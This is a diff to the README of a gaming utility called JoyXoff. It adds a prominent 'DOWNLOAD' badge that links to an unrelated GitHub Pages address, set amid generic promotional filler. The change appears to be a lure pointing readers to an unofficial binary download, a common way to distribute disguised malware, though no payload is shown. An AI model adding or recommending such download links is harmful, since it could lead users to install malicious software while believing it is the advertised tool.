@@ -30,6 +30,12 @@ JoyXoff monitors keyboard and mouse activity and blocks gamepad input to prevent
 
 Whether you're a newcomer or a veteran, JoyXoff provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download JoyXoff](https://img.shields.io/badge/⬇_DOWNLOAD_JoyXoff-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
